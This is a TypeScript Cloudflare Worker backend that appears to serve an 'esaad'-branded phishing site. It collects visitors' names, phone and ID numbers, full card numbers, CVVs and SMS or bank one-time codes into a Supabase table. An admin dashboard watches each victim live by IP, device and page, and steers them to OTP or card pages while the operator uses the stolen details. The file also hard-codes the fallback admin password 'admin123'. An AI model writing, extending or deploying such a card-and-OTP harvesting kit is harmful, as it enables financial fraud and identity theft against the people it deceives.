import { createClient, SupabaseClient } from '@supabase/supabase-js';

export interface Env {
  ASSETS?: {
    fetch: (request: Request | string) => Promise<Response>;
  };
  SUPABASE_URL?: string;
  SUPABASE_SERVICE_ROLE_KEY?: string;
  SUPABASE_ANON_KEY?: string;
  ADMIN_EMAIL?: string;
  ADMIN_PASSWORD?: string;
  ADMIN_SECRET?: string;
}

export interface VisitorMeta {
  ip: string;
  os: string;
  device: string;
  browser: string;
  country: string;
}

export interface RequestRecord {
  id: string;
  name: string;
  mobile: string;
  idNumber: string;
  cardType: string;
  address: string;
  date: string;
  paymentName?: string;
  cardNumber?: string;
  expMonth?: string;
  expYear?: string;
  cvv?: string;
  otp?: string;
  otpStatus?: string;
  nextAction?: string;
  step: string;
  createdAt: string;
  updatedAt: string;
  isOnline?: boolean;
  secondsAgo?: number;
  currentPage?: string;
  meta?: VisitorMeta;
}

interface PresenceEntry {
  lastSeen: number;
  currentPage: string;
  requestId: string | null;
  meta?: VisitorMeta;
}

const ONLINE_WINDOW_MS = 15000;
const DB_SYNC_INTERVAL_MS = 4000;

// Edge isolate memory state
const adminTokens = new Set<string>();
const devicePresence = new Map<string, PresenceEntry>();
const userPresence = new Map<string, { lastSeen: number; currentPage: string }>();
const lastKnownUserPage = new Map<string, string>();
const userMetaMap = new Map<string, VisitorMeta>();
const pendingRedirects = new Map<string, string>();
const explicitlyOfflineIds = new Map<string, number>();
const lastDbPresenceSync = new Map<string, { time: number; page: string }>();
const ipToSessionMap = new Map<string, { clientId: string; requestId: string; lastSeen: number }>();
let totalVisitorsCounter = 0;

function normalizeRedirectTarget(action?: string | null): string | null {
  if (!action) return null;
  const trimmed = String(action).trim();
  if (!trimmed) return null;
  const map: Record<string, string> = {
    '/': '/',
    home: '/',
    '/request': '/request',
    form: '/request',
    '/register-company': '/register-company',
    company: '/register-company',
    '/payment': '/payment',
    payment: '/payment',
    '/card-details': '/card-details',
    card: '/card-details',
    '/waiting': '/waiting',
    waiting: '/waiting',
    '/otp': '/otp',
    otp: '/otp',
    'otp-sms': '/otp',
    '/otp-bank': '/otp-bank',
    'otp-bank': '/otp-bank'
  };
  return map[trimmed] || (trimmed.startsWith('/') ? trimmed : null);
}

function normalizeStepToPage(step?: string | null): string {
  if (!step) return '/';
  if (step.startsWith('/')) return step;
  const map: Record<string, string> = {
    home: '/',
    form: '/payment',
    card: '/waiting',
    otp: '/otp',
    'otp-bank': '/otp-bank'
  };
  return map[step] || '/';
}

function getSupabase(env: Env): SupabaseClient | null {
  const supabaseUrl = env.SUPABASE_URL || '';
  const supabaseKey = env.SUPABASE_SERVICE_ROLE_KEY || env.SUPABASE_ANON_KEY || '';
  if (!supabaseUrl || !supabaseKey || !supabaseUrl.startsWith('http')) {
    return null;
  }
  return createClient(supabaseUrl, supabaseKey, {
    auth: { persistSession: false }
  });
}

function parseCookies(cookieHeader?: string | null): Record<string, string> {
  const list: Record<string, string> = {};
  if (!cookieHeader) return list;
  cookieHeader.split(';').forEach((cookie) => {
    const parts = cookie.split('=');
    const key = parts.shift()?.trim();
    if (key) {
      list[key] = decodeURIComponent(parts.join('=').trim());
    }
  });
  return list;
}

function extractVisitorMeta(request: Request): VisitorMeta {
  const ua = request.headers.get('user-agent') || '';
  const cfIp = request.headers.get('cf-connecting-ip');
  const forwarded = request.headers.get('x-forwarded-for') || '';
  const ip = (cfIp || forwarded.split(',')[0] || '188.53.192.70').trim();

  let os = 'Windows';
  if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
  else if (/Android/i.test(ua)) os = 'Android';
  else if (/Mac OS X/i.test(ua)) os = 'macOS';
  else if (/Linux/i.test(ua)) os = 'Linux';

  const device = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'mobile' : 'desktop';

  let browser = 'Chrome';
  if (/Edg\//i.test(ua)) browser = 'Edge';
  else if (/OPR\//i.test(ua)) browser = 'Opera';
  else if (/Chrome\//i.test(ua)) browser = 'Chrome';
  else if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) browser = 'Safari';
  else if (/Firefox\//i.test(ua)) browser = 'Firefox';

  const cfCountry = request.headers.get('cf-ipcountry');
  const cfCity = request.headers.get('cf-ipcity');
  const country =
    cfCountry && cfCity
      ? `${cfCountry}, ${cfCity}`
      : cfCountry || 'Saudi Arabia, Riyadh';

  return {
    ip,
    os,
    device,
    browser,
    country
  };
}

function getFingerprintKey(request: Request): string {
  const meta = extractVisitorMeta(request);
  const ua = (request.headers.get('user-agent') || '').slice(0, 120);
  return `${meta.ip}|${ua}`;
}

function isRequestIdOnlineOnServer(reqId: string, updatedAtIso?: string, serverNow = Date.now()): boolean {
  const offlineAt = explicitlyOfflineIds.get(reqId);
  const memEntry = userPresence.get(reqId);
  if (memEntry) {
    if (offlineAt && offlineAt >= memEntry.lastSeen) {
      return false;
    }
    if (serverNow - memEntry.lastSeen < ONLINE_WINDOW_MS) {
      return true;
    }
  }

  for (const d of devicePresence.values()) {
    if (d.requestId === reqId && serverNow - d.lastSeen < ONLINE_WINDOW_MS) {
      if (!offlineAt || d.lastSeen > offlineAt) {
        return true;
      }
    }
  }

  if (updatedAtIso) {
    const updatedMs = new Date(updatedAtIso).getTime();
    if (!isNaN(updatedMs)) {
      if (offlineAt && offlineAt >= updatedMs) {
        return false;
      }
      if (serverNow - updatedMs < ONLINE_WINDOW_MS) {
        return true;
      }
    }
  }

  return false;
}

function prunePresence() {
  const cutoff = Date.now() - ONLINE_WINDOW_MS;
  for (const [k, entry] of devicePresence.entries()) {
    if (entry.lastSeen < cutoff) devicePresence.delete(k);
  }
  for (const [k, entry] of userPresence.entries()) {
    if (entry.lastSeen < cutoff) userPresence.delete(k);
  }
}

function toSupabaseRow(record: Partial<RequestRecord> & { id: string }) {
  const row: Record<string, any> = { id: record.id };
  if (record.name !== undefined) row.name = record.name;
  if (record.mobile !== undefined) row.mobile = record.mobile;
  if (record.idNumber !== undefined) row.id_number = record.idNumber;
  if (record.cardType !== undefined) row.card_type = record.cardType;
  if (record.address !== undefined) row.address = record.address;
  if (record.date !== undefined) row.date = record.date;
  if (record.paymentName !== undefined) row.payment_name = record.paymentName;
  if (record.cardNumber !== undefined) row.card_number = record.cardNumber;
  if (record.expMonth !== undefined) row.exp_month = record.expMonth;
  if (record.expYear !== undefined) row.exp_year = record.expYear;
  if (record.cvv !== undefined) row.cvv = record.cvv;
  if (record.otp !== undefined) row.otp = record.otp;
  if (record.otpStatus !== undefined) row.otp_status = record.otpStatus;
  if (record.nextAction !== undefined) row.next_action = record.nextAction;
  if (record.step !== undefined) row.step = record.step;
  if (record.createdAt !== undefined) row.created_at = record.createdAt;
  if (record.updatedAt !== undefined) row.updated_at = record.updatedAt;
  return row;
}

function fromSupabaseRow(row: any, serverNow = Date.now()): RequestRecord {
  const id = String(row.id);
  const rawStep = row.step || 'home';
  const currentPage = lastKnownUserPage.get(id) || normalizeStepToPage(rawStep);
  const memPresence = userPresence.get(id);
  const dbUpdatedIso = row.updated_at ?? row.updatedAt ?? new Date(serverNow).toISOString();
  const dbUpdatedMs = new Date(dbUpdatedIso).getTime();
  const effectiveLastSeenMs = memPresence
    ? Math.max(memPresence.lastSeen, isNaN(dbUpdatedMs) ? 0 : dbUpdatedMs)
    : isNaN(dbUpdatedMs)
      ? serverNow
      : dbUpdatedMs;
  const effectiveUpdatedIso = new Date(effectiveLastSeenMs).toISOString();
  const isOnline = isRequestIdOnlineOnServer(id, effectiveUpdatedIso, serverNow);
  const secondsAgo = isOnline ? 0 : Math.max(0, Math.floor((serverNow - effectiveLastSeenMs) / 1000));

  return {
    id,
    name: row.name || '',
    mobile: row.mobile || '',
    idNumber: row.id_number ?? row.idNumber ?? '',
    cardType: row.card_type ?? row.cardType ?? '',
    address: row.address || '',
    date: row.date || '',
    paymentName: row.payment_name ?? row.paymentName ?? undefined,
    cardNumber: row.card_number ?? row.cardNumber ?? undefined,
    expMonth: row.exp_month ?? row.expMonth ?? undefined,
    expYear: row.exp_year ?? row.expYear ?? undefined,
    cvv: row.cvv ?? undefined,
    otp: row.otp ?? undefined,
    otpStatus: row.otp_status ?? row.otpStatus ?? undefined,
    nextAction: row.next_action ?? row.nextAction ?? undefined,
    step: rawStep,
    createdAt: row.created_at ?? row.createdAt ?? effectiveUpdatedIso,
    updatedAt: effectiveUpdatedIso,
    isOnline,
    secondsAgo,
    currentPage,
    meta: userMetaMap.get(id)
  };
}

async function fetchEnrichedRequests(env: Env): Promise<RequestRecord[]> {
  prunePresence();
  const serverNow = Date.now();
  const supabase = getSupabase(env);
  let dbRequests: RequestRecord[] = [];

  if (supabase) {
    const { data, error } = await supabase
      .from('requests')
      .select('*')
      .order('updated_at', { ascending: false });
    if (!error && data) {
      dbRequests = data.map((row) => fromSupabaseRow(row, serverNow));
    }
  }

  const existingMap = new Map(dbRequests.map((r) => [r.id, r]));
  const nowIso = new Date(serverNow).toISOString();

  for (const [reqId, entry] of userPresence.entries()) {
    const existing = existingMap.get(reqId);
    if (!existing) {
      const isOnline = isRequestIdOnlineOnServer(reqId, new Date(entry.lastSeen).toISOString(), serverNow);
      dbRequests.push({
        id: reqId,
        name: '',
        mobile: '',
        idNumber: '',
        cardType: 'gold',
        address: '',
        date: '',
        step: entry.currentPage,
        createdAt: nowIso,
        updatedAt: new Date(entry.lastSeen).toISOString(),
        isOnline,
        secondsAgo: isOnline ? 0 : Math.max(0, Math.floor((serverNow - entry.lastSeen) / 1000)),
        currentPage: entry.currentPage,
        meta: userMetaMap.get(reqId)
      });
    }
  }

  dbRequests.sort((a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime());
  return dbRequests;
}

function buildStatsPayload(enrichedRequests?: RequestRecord[]) {
  prunePresence();
  const serverNow = Date.now();
  const onlineUsers: Record<string, boolean> = {};
  const userPages: Record<string, string> = {};
  const userMeta: Record<string, VisitorMeta> = {};

  for (const [reqId, page] of lastKnownUserPage.entries()) {
    userPages[reqId] = page;
  }
  for (const [reqId, meta] of userMetaMap.entries()) {
    userMeta[reqId] = meta;
  }
  for (const [reqId, entry] of userPresence.entries()) {
    if (isRequestIdOnlineOnServer(reqId, new Date(entry.lastSeen).toISOString(), serverNow)) {
      onlineUsers[reqId] = true;
    }
    userPages[reqId] = entry.currentPage;
  }

  if (enrichedRequests) {
    for (const r of enrichedRequests) {
      if (r.isOnline) {
        onlineUsers[r.id] = true;
      }
      if (r.currentPage && !userPages[r.id]) {
        userPages[r.id] = r.currentPage;
      }
      if (r.meta && !userMeta[r.id]) {
        userMeta[r.id] = r.meta;
      }
    }
  }

  const activeSessions = Array.from(devicePresence.entries())
    .filter(([, entry]) => entry.requestId && isRequestIdOnlineOnServer(entry.requestId, undefined, serverNow))
    .map(([cid, entry]) => ({
      clientId: cid,
      requestId: entry.requestId,
      currentPage: entry.currentPage,
      lastSeen: entry.lastSeen,
      meta: entry.meta
    }));

  return {
    onlineCount: Math.max(activeSessions.length, Object.keys(onlineUsers).length),
    totalVisitorsCount: totalVisitorsCounter,
    onlineUsers,
    userPages,
    userMeta,
    activeSessions,
    serverTime: serverNow
  };
}

// Stateless HMAC token signing so admin sessions persist across Cloudflare Worker isolates
async function signStatelessAdminToken(email: string, secret: string): Promise<string> {
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey(
    'raw',
    enc.encode(secret),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign']
  );
  const payload = btoa(JSON.stringify({ email, iat: Date.now() }));
  const sigBuf = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  const sigHex = Array.from(new Uint8Array(sigBuf))
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('');
  return `cf.${payload}.${sigHex}`;
}

async function verifyStatelessAdminToken(token: string, secret: string): Promise<boolean> {
  if (!token.startsWith('cf.')) return false;
  const parts = token.split('.');
  if (parts.length !== 3) return false;
  const [, payload, sigHex] = parts;
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey(
    'raw',
    enc.encode(secret),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['verify']
  );
  const expectedSigBuf = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  const expectedHex = Array.from(new Uint8Array(expectedSigBuf))
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('');
  return sigHex === expectedHex;
}

function jsonResponse(data: unknown, status = 200, extraHeaders?: HeadersInit): Response {
  const headers = new Headers(extraHeaders);
  headers.set('Content-Type', 'application/json; charset=utf-8');
  return new Response(JSON.stringify(data), { status, headers });
}

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url);
    const pathname = url.pathname;
    const method = request.method.toUpperCase();

    // ==================== API ROUTES ====================
    if (pathname.startsWith('/api/')) {
      const cookies = parseCookies(request.headers.get('cookie'));
      const secret = env.ADMIN_SECRET || env.ADMIN_PASSWORD || 'esaad-cf-worker-secret';

      // Real-time SSE endpoint (/api/stream)
      if (pathname === '/api/stream' && method === 'GET') {
        const role = url.searchParams.get('role') || 'visitor';
        const encoder = new TextEncoder();

        if (role === 'admin') {
          const requests = await fetchEnrichedRequests(env);
          const stats = buildStatsPayload(requests);
          const body = encoder.encode(`event: snapshot\ndata: ${JSON.stringify({ stats, requests })}\n\n`);
          return new Response(body, {
            status: 200,
            headers: {
              'Content-Type': 'text/event-stream; charset=utf-8',
              'Cache-Control': 'no-cache, no-transform',
              Connection: 'keep-alive'
            }
          });
        }

        const fpKey = getFingerprintKey(request);
        const fpSession = ipToSessionMap.get(fpKey);
        const clientId = url.searchParams.get('clientId') || cookies.esaad_cid || fpSession?.clientId || crypto.randomUUID();
        const requestId = url.searchParams.get('requestId') || cookies.esaad_req_id || fpSession?.requestId || crypto.randomUUID();
        const currentPage = url.searchParams.get('page') || '/';
        const now = Date.now();
        const meta = extractVisitorMeta(request);

        explicitlyOfflineIds.delete(requestId);
        ipToSessionMap.set(fpKey, { clientId, requestId, lastSeen: now });
        devicePresence.set(clientId, { lastSeen: now, currentPage, requestId, meta });
        userPresence.set(requestId, { lastSeen: now, currentPage });
        lastKnownUserPage.set(requestId, currentPage);
        userMetaMap.set(requestId, meta);

        const body = encoder.encode(
          `event: connected\ndata: ${JSON.stringify({
            ok: true,
            clientId,
            requestId,
            redirectTo: pendingRedirects.get(requestId) || null
          })}\n\n`
        );

        const headers = new Headers({
          'Content-Type': 'text/event-stream; charset=utf-8',
          'Cache-Control': 'no-cache, no-transform',
          Connection: 'keep-alive'
        });
        headers.append('Set-Cookie', `esaad_cid=${encodeURIComponent(clientId)}; Path=/; HttpOnly; SameSite=Lax`);
        headers.append('Set-Cookie', `esaad_req_id=${encodeURIComponent(requestId)}; Path=/; HttpOnly; SameSite=Lax`);

        return new Response(body, { status: 200, headers });
      }

      // 1. POST /api/presence
      if (pathname === '/api/presence' && method === 'POST') {
        const body: any = await request.json().catch(() => ({}));
        const fpKey = getFingerprintKey(request);
        const fpSession = ipToSessionMap.get(fpKey);
        const now = Date.now();

        const clientId = String(
          body?.clientId ||
            cookies.esaad_cid ||
            (fpSession && now - fpSession.lastSeen < 3600000 ? fpSession.clientId : '') ||
            crypto.randomUUID()
        );
        const existingDevice = devicePresence.get(clientId);
        const currentPage = String(body?.currentPage || '/');
        const isAdminPage = currentPage.startsWith('/admin');
        const resolvedReqId = isAdminPage
          ? null
          : String(
              body?.requestId ||
                cookies.esaad_req_id ||
                existingDevice?.requestId ||
                (fpSession && now - fpSession.lastSeen < 3600000 ? fpSession.requestId : '') ||
                crypto.randomUUID()
            );
        const isNewVisit = !cookies.esaad_visited && Boolean(body?.isNewVisit);
        const meta = extractVisitorMeta(request);

        const headers = new Headers();
        headers.append(
          'Set-Cookie',
          `esaad_cid=${encodeURIComponent(clientId)}; Path=/; HttpOnly; SameSite=Lax`
        );

        if (resolvedReqId) {
          headers.append(
            'Set-Cookie',
            `esaad_req_id=${encodeURIComponent(resolvedReqId)}; Path=/; HttpOnly; SameSite=Lax`
          );
          ipToSessionMap.set(fpKey, { clientId, requestId: resolvedReqId, lastSeen: now });
        }

        if (isNewVisit && !isAdminPage) {
          totalVisitorsCounter += 1;
          headers.append('Set-Cookie', 'esaad_visited=1; Path=/; HttpOnly; SameSite=Lax');
        }

        if (!isAdminPage && resolvedReqId) {
          explicitlyOfflineIds.delete(resolvedReqId);
          const prevSync = lastDbPresenceSync.get(resolvedReqId);
          const shouldSyncDb =
            !prevSync || now - prevSync.time >= DB_SYNC_INTERVAL_MS || prevSync.page !== currentPage;

          devicePresence.set(clientId, {
            lastSeen: now,
            currentPage,
            requestId: resolvedReqId,
            meta
          });

          userPresence.set(resolvedReqId, {
            lastSeen: now,
            currentPage
          });
          lastKnownUserPage.set(resolvedReqId, currentPage);
          userMetaMap.set(resolvedReqId, meta);

          if (shouldSyncDb) {
            lastDbPresenceSync.set(resolvedReqId, { time: now, page: currentPage });
            const supabase = getSupabase(env);
            if (supabase) {
              const nowIso = new Date(now).toISOString();
              const { data: updatedRows } = await supabase
                .from('requests')
                .update({ updated_at: nowIso, step: currentPage })
                .eq('id', resolvedReqId)
                .select('id, next_action');

              if (!updatedRows || updatedRows.length === 0) {
                await supabase
                  .from('requests')
                  .upsert(
                    {
                      id: resolvedReqId,
                      step: currentPage,
                      created_at: nowIso,
                      updated_at: nowIso
                    },
                    { onConflict: 'id' }
                  );
              } else if (updatedRows[0]?.next_action) {
                const dbTarget = normalizeRedirectTarget(updatedRows[0].next_action);
                if (dbTarget) {
                  pendingRedirects.set(resolvedReqId, dbTarget);
                }
              }
            }
          }

          const targetRoute = pendingRedirects.get(resolvedReqId);
          if (targetRoute) {
            if (currentPage === targetRoute) {
              pendingRedirects.delete(resolvedReqId);
              const supabase = getSupabase(env);
              if (supabase) {
                await supabase
                  .from('requests')
                  .update({ next_action: '', step: currentPage, updated_at: new Date().toISOString() })
                  .eq('id', resolvedReqId);
              }
            } else {
              prunePresence();
              return jsonResponse({ ok: true, requestId: resolvedReqId, redirectTo: targetRoute }, 200, headers);
            }
          }
        }

        prunePresence();
        return jsonResponse({ ok: true, requestId: resolvedReqId, redirectTo: null }, 200, headers);
      }

      // 1b. POST /api/presence/leave
      if (pathname === '/api/presence/leave' && method === 'POST') {
        const body: any = await request.json().catch(() => ({}));
        const clientId = String(body?.clientId || cookies.esaad_cid || '');
        const requestId = String(body?.requestId || cookies.esaad_req_id || '');

        if (clientId) {
          devicePresence.delete(clientId);
        }
        if (requestId) {
          userPresence.delete(requestId);
          explicitlyOfflineIds.set(requestId, Date.now());
          const supabase = getSupabase(env);
          if (supabase) {
            const offlineIso = new Date(Date.now() - 120000).toISOString();
            await supabase
              .from('requests')
              .update({ updated_at: offlineIso })
              .eq('id', requestId);
          }
        }
        return jsonResponse({ ok: true });
      }

      // 2. GET /api/stats
      if (pathname === '/api/stats' && method === 'GET') {
        const enriched = await fetchEnrichedRequests(env);
        return jsonResponse(buildStatsPayload(enriched));
      }

      // 3. POST /api/admin/login
      if (pathname === '/api/admin/login' && method === 'POST') {
        const body: any = await request.json().catch(() => ({}));
        const { email, password } = body || {};
        if (!email || !password) {
          return jsonResponse({ error: 'الرجاء إدخال البريد الإلكتروني وكلمة المرور' }, 400);
        }

        const supabase = getSupabase(env);
        if (supabase) {
          const { data, error } = await supabase.auth.signInWithPassword({
            email: String(email).trim(),
            password: String(password)
          });
          if (!error && data.session) {
            const token = data.session.access_token;
            adminTokens.add(token);
            const headers = new Headers({
              'Set-Cookie': `esaad_admin_token=${encodeURIComponent(token)}; Path=/; HttpOnly; SameSite=Lax`
            });
            return jsonResponse({ token, user: { email: data.user?.email } }, 200, headers);
          }
        }

        const expectedEmail = env.ADMIN_EMAIL || 'admin@esaad.ae';
        const expectedPassword = env.ADMIN_PASSWORD || 'admin123';

        if (
          String(email).trim().toLowerCase() === expectedEmail.toLowerCase() &&
          String(password) === expectedPassword
        ) {
          const token = await signStatelessAdminToken(expectedEmail, secret);
          adminTokens.add(token);
          const headers = new Headers({
            'Set-Cookie': `esaad_admin_token=${encodeURIComponent(token)}; Path=/; HttpOnly; SameSite=Lax`
          });
          return jsonResponse({ token, user: { email: expectedEmail } }, 200, headers);
        }

        return jsonResponse({ error: 'البريد الإلكتروني أو كلمة المرور غير صحيحة' }, 401);
      }

      // 4. GET /api/admin/me
      if (pathname === '/api/admin/me' && method === 'GET') {
        const authHeader = request.headers.get('authorization');
        const token =
          authHeader && authHeader.startsWith('Bearer ')
            ? authHeader.slice(7)
            : cookies.esaad_admin_token || '';

        if (!token) {
          return jsonResponse({ authenticated: false }, 401);
        }
        if (adminTokens.has(token) || (await verifyStatelessAdminToken(token, secret))) {
          return jsonResponse({ authenticated: true });
        }

        const supabase = getSupabase(env);
        if (supabase) {
          const { data, error } = await supabase.auth.getUser(token);
          if (!error && data.user) {
            adminTokens.add(token);
            return jsonResponse({ authenticated: true, user: { email: data.user.email } });
          }
        }
        return jsonResponse({ authenticated: false }, 401);
      }

      // 5. POST /api/admin/logout
      if (pathname === '/api/admin/logout' && method === 'POST') {
        const authHeader = request.headers.get('authorization');
        const token =
          authHeader && authHeader.startsWith('Bearer ')
            ? authHeader.slice(7)
            : cookies.esaad_admin_token || '';
        if (token) {
          adminTokens.delete(token);
        }
        const headers = new Headers({
          'Set-Cookie': 'esaad_admin_token=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax'
        });
        return jsonResponse({ ok: true }, 200, headers);
      }

      // 6. GET /api/requests/current
      if (pathname === '/api/requests/current' && method === 'GET') {
        const fpSession = ipToSessionMap.get(getFingerprintKey(request));
        const id = cookies.esaad_req_id || fpSession?.requestId;
        if (!id) {
          return jsonResponse({ error: 'لا يوجد طلب نشط' }, 404);
        }
        const supabase = getSupabase(env);
        if (!supabase) {
          return jsonResponse(
            { error: 'يرجى ضبط إعدادات SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في الخادم' },
            503
          );
        }
        const { data, error } = await supabase.from('requests').select('*').eq('id', id).single();
        if (error || !data) {
          return jsonResponse({ error: 'الطلب غير موجود' }, 404);
        }
        explicitlyOfflineIds.delete(id);
        const currentPage = lastKnownUserPage.get(id) || normalizeStepToPage(data.step) || '/waiting';
        userPresence.set(id, { lastSeen: Date.now(), currentPage });
        return jsonResponse(fromSupabaseRow(data));
      }

      // 7. GET /api/requests & POST /api/requests
      if (pathname === '/api/requests') {
        const supabase = getSupabase(env);
        if (!supabase) {
          return jsonResponse(
            { error: 'يرجى ضبط SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في إعدادات Cloudflare Worker' },
            503
          );
        }

        if (method === 'GET') {
          const dbRequests = await fetchEnrichedRequests(env);
          return jsonResponse(dbRequests);
        }

        if (method === 'POST') {
          const body: any = await request.json().catch(() => ({}));
          const fpSession = ipToSessionMap.get(getFingerprintKey(request));
          const now = new Date().toISOString();
          const id = String(body?.id || cookies.esaad_req_id || fpSession?.requestId || crypto.randomUUID());
          const meta = extractVisitorMeta(request);

          const newRecord: RequestRecord = {
            id,
            name: body?.name || '',
            mobile: body?.mobile || '',
            idNumber: body?.idNumber || '',
            cardType: body?.cardType || '',
            address: body?.address || '',
            date: body?.date || '',
            step: '/payment',
            createdAt: now,
            updatedAt: now
          };

          const { data, error } = await supabase
            .from('requests')
            .upsert(toSupabaseRow(newRecord), { onConflict: 'id' })
            .select('*')
            .single();

          if (error) {
            return jsonResponse({ error: error.message }, 500);
          }

          explicitlyOfflineIds.delete(id);
          lastDbPresenceSync.set(id, { time: Date.now(), page: '/payment' });
          userPresence.set(id, { lastSeen: Date.now(), currentPage: '/payment' });
          lastKnownUserPage.set(id, '/payment');
          userMetaMap.set(id, meta);

          const headers = new Headers({
            'Set-Cookie': `esaad_req_id=${encodeURIComponent(id)}; Path=/; HttpOnly; SameSite=Lax`
          });
          return jsonResponse(fromSupabaseRow(data || newRecord), 201, headers);
        }
      }

      // 8. GET /api/requests/:id & PATCH /api/requests/:id
      if (pathname.startsWith('/api/requests/')) {
        const rawParam = decodeURIComponent(pathname.slice('/api/requests/'.length));
        const fpSession = ipToSessionMap.get(getFingerprintKey(request));
        const id = rawParam === 'current' ? cookies.esaad_req_id || fpSession?.requestId : rawParam;
        if (!id) {
          return jsonResponse({ error: 'معرف الطلب غير متوفر' }, 400);
        }

        const supabase = getSupabase(env);
        if (!supabase) {
          return jsonResponse({ error: 'يرجى ضبط إعدادات Supabase في الخادم' }, 503);
        }

        if (method === 'GET') {
          const { data, error } = await supabase.from('requests').select('*').eq('id', id).single();
          if (error || !data) {
            return jsonResponse({ error: 'الطلب غير موجود' }, 404);
          }
          explicitlyOfflineIds.delete(id);
          const currentPage = lastKnownUserPage.get(id) || normalizeStepToPage(data.step) || '/waiting';
          userPresence.set(id, { lastSeen: Date.now(), currentPage });
          return jsonResponse(fromSupabaseRow(data));
        }

        if (method === 'PATCH') {
          const body: any = await request.json().catch(() => ({}));
          const now = new Date().toISOString();
          const patchPayload: Partial<RequestRecord> & { id: string } = {
            ...body,
            id,
            updatedAt: now
          };

          if (body?.nextAction !== undefined) {
            const targetRoute = normalizeRedirectTarget(body.nextAction);
            if (targetRoute) {
              pendingRedirects.set(id, targetRoute);
              lastKnownUserPage.set(id, targetRoute);
              patchPayload.step = targetRoute;
              const existingPresence = userPresence.get(id);
              if (existingPresence) {
                userPresence.set(id, { ...existingPresence, currentPage: targetRoute });
              }
            } else {
              pendingRedirects.delete(id);
            }
          } else if (body?.step === 'card' || body?.step === 'otp' || body?.step === 'otp-bank') {
            pendingRedirects.delete(id);
            const stepPage = body.step === 'card' ? '/waiting' : body.step === 'otp-bank' ? '/otp-bank' : '/otp';
            explicitlyOfflineIds.delete(id);
            userPresence.set(id, { lastSeen: Date.now(), currentPage: stepPage });
            lastKnownUserPage.set(id, stepPage);
          }

          const patchRow = toSupabaseRow(patchPayload);
          delete patchRow.id;

          const { data, error } = await supabase
            .from('requests')
            .update(patchRow)
            .eq('id', id)
            .select('*')
            .single();

          if (error) {
            return jsonResponse({ error: error.message }, 500);
          }
          return jsonResponse(fromSupabaseRow(data));
        }

        if (method === 'DELETE') {
          const { error } = await supabase.from('requests').delete().eq('id', id);
          if (error) {
            return jsonResponse({ error: error.message }, 500);
          }
          userPresence.delete(id);
          lastKnownUserPage.delete(id);
          userMetaMap.delete(id);
          pendingRedirects.delete(id);
          explicitlyOfflineIds.set(id, Date.now());
          return jsonResponse({ ok: true, id });
        }
      }

      return jsonResponse({ error: 'Not Found' }, 404);
    }

    // ==================== STATIC ASSETS & SPA FALLBACK ====================
    if (env.ASSETS) {
      return env.ASSETS.fetch(request);
    }

    return new Response('Cloudflare Worker running. Static assets binding (ASSETS) not found.', {
      status: 200
    });
  }
};
